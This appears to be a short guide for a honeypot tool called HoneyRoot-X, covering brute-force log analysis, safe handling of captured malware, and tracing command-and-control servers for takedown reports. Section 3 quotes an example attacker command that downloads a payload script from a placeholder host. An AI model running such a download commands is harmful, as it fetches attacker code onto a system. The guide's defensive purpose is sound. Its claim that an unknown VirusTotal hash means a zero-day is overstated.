# Threat Hunting with HoneyRoot-X

## 1. Analyzing Brute Force Trends
Use the `auth_attempt` events in `honeypot.json` to identify common botnet credential dictionaries. 

## 2. Reverse Engineering Payloads
All intercepted malware is stored in `logs/payloads/`. 
* **DO NOT** execute these files on your host machine.
* Upload the SHA-256 hash to VirusTotal. 
* If VirusTotal returns a `404 Not Found`, you have discovered a zero-day or a uniquely packed binary. Use tools like `Ghidra` or `Radare2` in an isolated VM to analyze them.

## 3. Tracking C2 Infrastructure
When an attacker runs `wget http://x.x.x.x/payload.sh`, extract that IP. This is often the Command and Control (C2) server. You can report these IPs to their hosting providers (like DigitalOcean, AWS, or Linode) to get the malicious infrastructure taken down.
